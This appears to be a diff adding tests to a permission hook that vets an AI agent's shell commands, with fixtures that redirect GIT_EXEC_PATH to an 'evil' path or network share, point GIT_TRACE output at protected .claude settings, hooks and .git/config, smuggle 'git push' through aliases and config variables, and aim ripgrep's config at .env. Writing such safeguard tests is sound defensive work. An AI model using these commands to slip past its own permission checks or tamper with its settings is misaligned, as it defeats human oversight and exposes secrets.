@@ -1469,6 +1469,14 @@ const SECURITY_RELEVANT_ENV_NAMES_FOR_TEST_ISOLATION = [
   'GIT_CONFIG_GLOBAL', 'GIT_CONFIG_SYSTEM', 'GIT_INDEX_FILE', 'GIT_DIR', 'GIT_COMMON_DIR',
   'GIT_WORK_TREE', 'GIT_OBJECT_DIRECTORY', 'GIT_ALTERNATE_OBJECT_DIRECTORIES', 'XDG_CONFIG_HOME',
   'GIT_NO_LAZY_FETCH', 'RIPGREP_CONFIG_PATH', 'GIT_CONFIG_COUNT', 'GIT_CONFIG_PARAMETERS',
+  'GIT_CONFIG_KEY_0', 'GIT_CONFIG_VALUE_0',
+  // R17 Blocker B/C: GIT_EXEC_PATH and every GIT_TRACE*/GIT_TRACE2* destination variable now feed
+  // into buildEffectiveEnvironment too - isolate them from the real dev/CI machine's environment for
+  // the same hermeticity reason as every other name in this list.
+  'GIT_EXEC_PATH',
+  'GIT_TRACE', 'GIT_TRACE_PERFORMANCE', 'GIT_TRACE_SETUP', 'GIT_TRACE_SHALLOW',
+  'GIT_TRACE_FSMONITOR', 'GIT_TRACE_PACK_ACCESS', 'GIT_TRACE_PACKET', 'GIT_TRACE_PACKFILE',
+  'GIT_TRACE_REFS', 'GIT_TRACE_CURL', 'GIT_TRACE2', 'GIT_TRACE2_EVENT', 'GIT_TRACE2_PERF',
 ];
 
 function runHookProcess(stdinText, envOverrides) {
@@ -4319,6 +4327,223 @@ test('IO 45: required negative controls never hard-deny through the real process
     'git --no-pager --no-lazy-fetch log -1 --oneline',
     "git -c alias.p='--no-lazy-fetch log -1 --oneline' -c alias.x='!git p' x",
     'rg needle input.txt',
+  ];
+  for (const cmd of negatives) {
+    const fixture = JSON.stringify({ hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command: cmd }, cwd: 'C:/repo' });
+    const r = runHookProcess(fixture);
+    assert.equal(r.status, 0, `exit code for: ${cmd}`);
+    assert.equal(r.stderr, '', `stderr for: ${cmd}`);
+    let decision = 'defer';
+    if (r.stdout.trim() !== '') decision = JSON.parse(r.stdout).hookSpecificOutput.permissionDecision;
+    assert.notEqual(decision, 'deny', `must not hard-deny: ${cmd}`);
+  }
+});
+
+// ===================== 46: R17 - normalize Windows env identity, close Git exec/trace output paths =====================
+
+// --- 46A: canonical (case-insensitive) environment-variable identity ---
+test('46A. ripgrep_config_path=.env (lowercase name) rg needle input.txt -> deny SECRET', () => {
+  assertDecision(classifyBash('ripgrep_config_path=.env rg needle input.txt'), 'deny', hook.RULE.SECRET);
+});
+test('46A. RiPgReP_CoNfIg_PaTh=C:/tmp/rg.conf (mixed case name) rg needle input.txt -> ask COMPLEX', () => {
+  assertDecision(classifyBash('RiPgReP_CoNfIg_PaTh=C:/tmp/rg.conf rg needle input.txt'), 'ask', hook.RULE.COMPLEX);
+});
+test("46A. git_pager='git push' (lowercase name) git --paginate --no-lazy-fetch log -1 --oneline -> deny GIT_PUSH", () => {
+  assertDecision(classifyBash("git_pager='git push' git --paginate --no-lazy-fetch log -1 --oneline"), 'deny', hook.RULE.GIT_PUSH);
+});
+test('46A. duplicate mixed-case keys in the same command: last effective occurrence wins (empty overrides non-empty)', () => {
+  assertDecision(classifyBash('RIPGREP_CONFIG_PATH=C:/tmp/a.conf ripgrep_config_path= rg needle input.txt'), 'defer');
+});
+test('46A. process-env RIPGREP_CONFIG_PATH via a lowercase-spelled ctx.env key still resolves (ask, not defer)', () => {
+  assertDecision(classifyBash('rg needle input.txt', { env: { ripgrep_config_path: 'C:/tmp/rg.conf' } }), 'ask', hook.RULE.COMPLEX);
+});
+test('46A. negative control: RIPGREP_CONFIG_PATH= (empty, leading assignment) rg needle input.txt -> defer', () => {
+  assertDecision(classifyBash('RIPGREP_CONFIG_PATH= rg needle input.txt'), 'defer');
+});
+
+// --- 46B: --config-env must resolve to an exact deny, not just an unresolved ask, across case ---
+test('46B. v=push git --config-env=alias.p=V p -> deny GIT_PUSH (assignment name lowercase, spec uppercase)', () => {
+  assertDecision(classifyBash('v=push git --config-env=alias.p=V p'), 'deny', hook.RULE.GIT_PUSH);
+});
+test('46B. V=push git --config-env=alias.p=v p -> deny GIT_PUSH (assignment name uppercase, spec lowercase)', () => {
+  assertDecision(classifyBash('V=push git --config-env=alias.p=v p'), 'deny', hook.RULE.GIT_PUSH);
+});
+
+// --- 46C: reserved scanner identity, every case variant floors to ask TAMPER, never defer ---
+test('46C. __amz_inherited_git_alias_context__=... (all lowercase) git p, no real alias -> ask TAMPER', () => {
+  assertDecision(classifyBash("__amz_inherited_git_alias_context__=\"'alias.p=--no-lazy-fetch log -1 --oneline'\" git p"), 'ask', hook.RULE.TAMPER);
+});
+test('46C. __Amz_Inherited_Git_Alias_Context__=... (mixed case) git p, no real alias -> ask TAMPER', () => {
+  assertDecision(classifyBash("__Amz_Inherited_Git_Alias_Context__=\"'alias.p=--no-lazy-fetch log -1 --oneline'\" git p"), 'ask', hook.RULE.TAMPER);
+});
+test('46C. lowercase reserved carrier alongside a REAL GIT_CONFIG_COUNT-defined alias.p=push -> deny GIT_PUSH (never weakened)', () => {
+  assertDecision(classifyBash("GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.p GIT_CONFIG_VALUE_0=push __amz_inherited_git_alias_context__=\"'alias.p=--no-lazy-fetch log -1 --oneline'\" git p"), 'deny', hook.RULE.GIT_PUSH);
+});
+
+// --- 46D: GIT_EXEC_PATH (R17 Blocker B) ---
+test('46D. GIT_EXEC_PATH=C:/tmp/evil (leading assignment) git submodule status -> ask, not defer', () => {
+  assertDecision(classifyBash('GIT_EXEC_PATH=C:/tmp/evil git submodule status'), 'ask', hook.RULE.COMPLEX);
+});
+test('46D. git_exec_path=C:/tmp/evil (lowercase name) git submodule status -> ask, not defer', () => {
+  assertDecision(classifyBash('git_exec_path=C:/tmp/evil git submodule status'), 'ask', hook.RULE.COMPLEX);
+});
+test('46D. GIT_EXEC_PATH in ctx.env (not a leading assignment) git submodule status -> ask, not defer', () => {
+  assertDecision(classifyBash('git submodule status', { env: { GIT_EXEC_PATH: 'C:/tmp/evil' } }), 'ask', hook.RULE.COMPLEX);
+});
+test('46D. GIT_EXEC_PATH=.env (leading assignment, exact secret path) git submodule status -> deny SECRET', () => {
+  assertDecision(classifyBash('GIT_EXEC_PATH=.env git submodule status'), 'deny', hook.RULE.SECRET);
+});
+test('46D. GIT_EXEC_PATH=// (leading assignment, UNC network target) git submodule status -> ask EGRESS', () => {
+  assertDecision(classifyBash('GIT_EXEC_PATH=//evil-server/share git submodule status'), 'ask', hook.RULE.EGRESS);
+});
+test('46D. GIT_EXEC_PATH= (leading assignment, empty value) git submodule status -> ask TAMPER', () => {
+  assertDecision(classifyBash('GIT_EXEC_PATH= git submodule status'), 'ask', hook.RULE.TAMPER);
+});
+test('46D. GIT_EXEC_PATH="$X" (dynamic, unresolved) git submodule status -> ask SECRET', () => {
+  assertDecision(classifyBash('GIT_EXEC_PATH="$X" git submodule status'), 'ask', hook.RULE.SECRET);
+});
+test("46D. an alias body's own --exec-path=<path> also floors the outer decision", () => {
+  assertDecision(classifyBash("git -c alias.x='--exec-path=C:/tmp/evil status' x"), 'ask', hook.RULE.COMPLEX);
+});
+
+// --- 46E: --exec-path global-option grammar (R17 Section 5) ---
+test('46E. git --exec-path (bare, no more tokens) -> may defer (terminal information mode, no other floor present)', () => {
+  assertDecision(classifyBash('git --exec-path'), 'defer');
+});
+test('46E. git --exec-path=C:/tmp/evil submodule status -> ask, not defer', () => {
+  assertDecision(classifyBash('git --exec-path=C:/tmp/evil submodule status'), 'ask', hook.RULE.COMPLEX);
+});
+test('46E. git --exec-path=.env submodule status -> deny SECRET (exact secret path)', () => {
+  assertDecision(classifyBash('git --exec-path=.env submodule status'), 'deny', hook.RULE.SECRET);
+});
+test('46E. regression: git --exec-path C:/tmp/evil submodule status -> must NOT silently defer as an ordinary read (old wrong-arity bug)', () => {
+  const r = classifyBash('git --exec-path C:/tmp/evil submodule status');
+  assert.notEqual(r.decision, 'defer', `must not treat the path as consumed and "submodule status" as an ordinary deferrable read: ${JSON.stringify(r)}`);
+  assert.notEqual(r.decision, 'deny', `must not decide based on the wrong arity either: ${JSON.stringify(r)}`);
+});
+test('46E. negative control: git --exec-path alone (no trailing tokens) -> not a hard-deny', () => {
+  assertDecision(classifyBash('git --exec-path'), 'defer');
+});
+
+// --- 46F: GIT_TRACE*/GIT_TRACE2* destination policy (R17 Blocker C) ---
+test('46F. GIT_TRACE=<protected settings.json> git log -> deny TAMPER', () => {
+  assertDecision(classifyBash('GIT_TRACE=C:/repo/.claude/settings.json git --no-pager --no-lazy-fetch log -1 --oneline'), 'deny', hook.RULE.TAMPER);
+});
+test('46F. GIT_TRACE2=<protected .claude/hooks dir> git log -> deny TAMPER', () => {
+  assertDecision(classifyBash('GIT_TRACE2=C:/repo/.claude/hooks git --no-pager --no-lazy-fetch log -1 --oneline'), 'deny', hook.RULE.TAMPER);
+});
+test('46F. GIT_TRACE2_EVENT=<protected .git/config> git log -> deny TAMPER', () => {
+  assertDecision(classifyBash('GIT_TRACE2_EVENT=C:/repo/.git/config git --no-pager --no-lazy-fetch log -1 --oneline'), 'deny', hook.RULE.TAMPER);
+});
+test('46F. git_trace=<protected settings.json> (lowercase name) git log -> deny TAMPER', () => {
+  assertDecision(classifyBash('git_trace=C:/repo/.claude/settings.json git --no-pager --no-lazy-fetch log -1 --oneline'), 'deny', hook.RULE.TAMPER);
+});
+test('46F. GIT_TRACE=af_unix:/tmp/git-trace.sock git log -> ask EGRESS', () => {
+  assertDecision(classifyBash('GIT_TRACE=af_unix:/tmp/git-trace.sock git --no-pager --no-lazy-fetch log -1 --oneline'), 'ask', hook.RULE.EGRESS);
+});
+test('46F. GIT_TRACE=C:/tmp/git.log (ordinary file target) git log -> ask TAMPER, not defer', () => {
+  assertDecision(classifyBash('GIT_TRACE=C:/tmp/git.log git --no-pager --no-lazy-fetch log -1 --oneline'), 'ask', hook.RULE.TAMPER);
+});
+test('46F. GIT_TRACE=1 (stderr mode) git log -> ask (conservative), not defer', () => {
+  assertDecision(classifyBash('GIT_TRACE=1 git --no-pager --no-lazy-fetch log -1 --oneline'), 'ask');
+});
+test('46F. GIT_TRACE=5 (inherited file descriptor) git log -> ask COMPLEX, not defer', () => {
+  assertDecision(classifyBash('GIT_TRACE=5 git --no-pager --no-lazy-fetch log -1 --oneline'), 'ask', hook.RULE.COMPLEX);
+});
+test('46F. GIT_TRACE="$X" (dynamic, unresolved) git log -> ask TAMPER', () => {
+  assertDecision(classifyBash('GIT_TRACE="$X" git --no-pager --no-lazy-fetch log -1 --oneline'), 'ask', hook.RULE.TAMPER);
+});
+test('46F. GIT_TRACE_FOO=somevalue (unrecognized GIT_TRACE*-shaped name) git log -> ask COMPLEX, not silently ignored', () => {
+  assertDecision(classifyBash('GIT_TRACE_FOO=somevalue git --no-pager --no-lazy-fetch log -1 --oneline'), 'ask', hook.RULE.COMPLEX);
+});
+test('46F. negative control: GIT_TRACE=0 git log -> defer', () => {
+  assertDecision(classifyBash('GIT_TRACE=0 git --no-pager --no-lazy-fetch log -1 --oneline'), 'defer');
+});
+test('46F. negative control: GIT_TRACE=false git log -> defer', () => {
+  assertDecision(classifyBash('GIT_TRACE=false git --no-pager --no-lazy-fetch log -1 --oneline'), 'defer');
+});
+test('46F. negative control: GIT_TRACE_FOO=0 (unrecognized name, disabled-shaped value) git log -> defer', () => {
+  assertDecision(classifyBash('GIT_TRACE_FOO=0 git --no-pager --no-lazy-fetch log -1 --oneline'), 'defer');
+});
+
+// --- 46G: trace process-environment fixtures (R17 Section 8) ---
+test('46G. GIT_TRACE=<protected settings.json> in ctx.env (not leading) git log -> deny TAMPER', () => {
+  assertDecision(classifyBash('git --no-pager --no-lazy-fetch log -1 --oneline', { env: { GIT_TRACE: 'C:/repo/.claude/settings.json' } }), 'deny', hook.RULE.TAMPER);
+});
+test('46G. git_trace2_event=<protected .git/config> in ctx.env (lowercase name, not leading) git log -> deny TAMPER', () => {
+  assertDecision(classifyBash('git --no-pager --no-lazy-fetch log -1 --oneline', { env: { git_trace2_event: 'C:/repo/.git/config' } }), 'deny', hook.RULE.TAMPER);
+});
+test('46G. leading git_trace=0 overrides a poisoned ctx.env GIT_TRACE (case-insensitively) -> not deny, defers', () => {
+  assertDecision(classifyBash('git_trace=0 git --no-pager --no-lazy-fetch log -1 --oneline', { env: { GIT_TRACE: 'C:/repo/.claude/settings.json' } }), 'defer');
+});
+
+// ===================== Direct hook I/O tests (R17 Section 10/11/12 gate) =====================
+
+test('IO 46: required process-env fixtures always resolve through the real process (defer count = 0, no raw env value leak)', () => {
+  // Canonical (uppercase) spelling only for the env-OPTION fixtures here - see the note above
+  // runHookProcess's default-clearing isolation list (Object.keys/Object.assign build the child's
+  // environment as a PLAIN JS object where two differently-cased keys, e.g. `RIPGREP_CONFIG_PATH`
+  // (cleared to undefined by the isolation default) and `ripgrep_config_path` (a real test override),
+  // are DISTINCT JS properties - but Windows' actual process environment is one case-insensitive
+  // namespace, so libuv/CreateProcessW resolve that same-name-different-case collision by dropping
+  // BOTH rather than keeping either, and the variable never reaches the child at all. This is a
+  // Windows spawnSync/env-object-construction artifact of THIS TEST HARNESS's own isolation
+  // mechanism, entirely below the hook's own code (which never runs, since the OS never delivered the
+  // variable) - it is not a gap in canonicalSecurityEnvName/buildEffectiveEnvironment, which are
+  // already proven correct for a lowercase-spelled ctx.env entry via the hermetic 46A/46G direct
+  // hook.classify() tests above (a plain in-memory ctx.env object has no such OS-level collision). The
+  // mixed-case ctx.env-inheritance requirement is fully covered there; this real-process gate sticks to
+  // canonical spelling to stay meaningful on this platform.
+  const fixtures = [
+    { env: { GIT_EXEC_PATH: 'C:/tmp/evil' }, cmd: 'git submodule status', expect: 'ask' },
+    { env: { GIT_TRACE: 'C:/repo/.claude/settings.json' }, cmd: 'git --no-pager --no-lazy-fetch log -1 --oneline', expect: 'deny' },
+    { env: { GIT_TRACE2_EVENT: 'C:/repo/.git/config' }, cmd: 'git --no-pager --no-lazy-fetch log -1 --oneline', expect: 'deny' },
+    { env: { RIPGREP_CONFIG_PATH: 'C:/tmp/rg.conf' }, cmd: 'rg needle input.txt', expect: 'ask' },
+  ];
+  let deferCount = 0;
+  for (const f of fixtures) {
+    const fixture = JSON.stringify({ hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command: f.cmd }, cwd: 'C:/repo' });
+    const r = runHookProcess(fixture, f.env);
+    assert.equal(r.status, 0, `exit code for: ${f.cmd}`);
+    assert.equal(r.stderr, '', `stderr for: ${f.cmd}`);
+    if (r.stdout.trim() === '') { deferCount += 1; continue; }
+    const parsed = JSON.parse(r.stdout);
+    assert.equal(parsed.hookSpecificOutput.permissionDecision, f.expect, `decision for: ${f.cmd}`);
+    assert.ok(!parsed.hookSpecificOutput.permissionDecisionReason.includes(f.cmd), `must not leak raw command for: ${f.cmd}`);
+  }
+  assert.equal(deferCount, 0);
+});
+
+test('IO 46: required command fixtures never defer through the real process', () => {
+  const required = [
+    'GIT_EXEC_PATH=C:/tmp/evil git submodule status',
+    'git --exec-path=C:/tmp/evil submodule status',
+    'GIT_TRACE=C:/repo/.claude/settings.json git --no-pager --no-lazy-fetch log -1 --oneline',
+    'GIT_TRACE2_EVENT=C:/repo/.git/config git --no-pager --no-lazy-fetch log -1 --oneline',
+    'ripgrep_config_path=.env rg needle input.txt',
+    'RiPgReP_CoNfIg_PaTh=C:/tmp/rg.conf rg needle input.txt',
+  ];
+  for (const cmd of required) {
+    const fixture = JSON.stringify({ hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command: cmd }, cwd: 'C:/repo' });
+    const r = runHookProcess(fixture);
+    assert.equal(r.status, 0, `exit code for: ${cmd}`);
+    assert.equal(r.stderr, '', `stderr for: ${cmd}`);
+    assert.notEqual(r.stdout.trim(), '', `must not defer: ${cmd}`);
+    const parsed = JSON.parse(r.stdout);
+    assert.ok(!parsed.hookSpecificOutput.permissionDecisionReason.includes(cmd), `must not leak raw command for: ${cmd}`);
+  }
+});
+
+test('IO 46: required negative controls never hard-deny through the real process', () => {
+  const negatives = [
+    'git --exec-path',
+    'git --no-pager --no-lazy-fetch log -1 --oneline',
+    'GIT_TRACE=0 git --no-pager --no-lazy-fetch log -1 --oneline',
+    'RIPGREP_CONFIG_PATH= rg needle input.txt',
+    // R16 negative controls that must continue to hold
+    "git -c alias.p='--no-lazy-fetch log -1 --oneline' -c alias.x='!git p' x",
+    'rg needle input.txt',
+    'rsync -a src/ backup/',
   ];
   for (const cmd of negatives) {
     const fixture = JSON.stringify({ hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command: cmd }, cwd: 'C:/repo' });
